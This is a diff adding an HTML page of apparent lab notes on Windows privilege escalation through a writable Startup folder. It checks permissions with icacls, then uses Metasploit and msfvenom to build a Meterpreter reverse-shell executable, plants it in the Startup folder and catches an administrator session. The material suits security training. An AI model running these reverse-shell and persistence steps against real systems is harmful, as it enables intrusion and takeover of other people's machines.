@@ -1,0 +1,35 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Overview (Startup Applications)</title>
+</head><body><b><u><div style="text-align: center"><span style="font-size: 20pt">Detection</span></div></u><span style="font-size: 15pt"><br/>
+</span></b><span style="font-size: 15pt"><br/>
+<b><u>Windows VM</u></b><br/>
+<br/>
+1. Open command prompt and type: <b>icacls.exe</b>&nbsp;<b>"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"</b><br/>
+2. From the output notice that the <b>“BUILTIN\Users”</b>&nbsp;group has full access <b>‘(F)’</b>&nbsp;to the directory.<br/>
+<br/>
+Exploitation<br/>
+<br/>
+Kali VM<br/>
+<br/>
+1. Open command prompt and type: msfconsole<br/>
+2. In Metasploit (msf &gt; prompt) type: use multi/handler<br/>
+3. In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp<br/>
+4. In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]<br/>
+5. In Metasploit (msf &gt; prompt) type: run<br/>
+6. Open another command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe<br/>
+7. Copy the generated file, x.exe, to the Windows VM.<br/>
+<br/>
+Windows VM<br/>
+<br/>
+1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.<br/>
+2. Logoff.<br/>
+3. Login with the administrator account credentials.<br/>
+<br/>
+Kali VM<br/>
+<br/>
+1. Wait for a session to be created, it may take a few seconds.<br/>
+2. In Meterpreter(meterpreter &gt; prompt) type: getuid<br/>
+3. From the output, notice the user is “User-PC\Admin”</span></body></html>
